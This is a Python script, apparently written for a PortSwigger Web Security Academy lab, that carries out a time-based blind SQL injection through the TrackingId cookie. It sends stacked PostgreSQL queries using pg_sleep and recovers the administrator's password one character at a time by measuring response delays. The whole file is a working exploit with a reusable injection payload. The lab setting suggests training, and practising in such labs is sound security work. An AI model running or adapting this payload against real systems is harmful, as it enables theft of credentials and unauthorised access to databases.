import requests, string, time

quess = ''

url = 'https://0a5000be04bbe46c8013c15a004f0019.web-security-academy.net/'
chars = string.ascii_lowercase + string.digits


searching = True

position = 1

while searching:
        for char in chars:

            start = time.time()
            headers = {'Cookie': f'TrackingId=xyz\'%3bSELECT CASE WHEN (username=\'administrator\' and password like \'{quess}{char}%25\') THEN pg_sleep(2) ELSE pg_sleep(0) END from users--'}
            response = requests.get(url,headers=headers)
            end = time.time()
            restime = (end -start)

            if restime > 2:
                quess += char
                position += 1
                print("Current password: " + quess)
                break
        else:
            print("No more valid characters found")
            exit(1)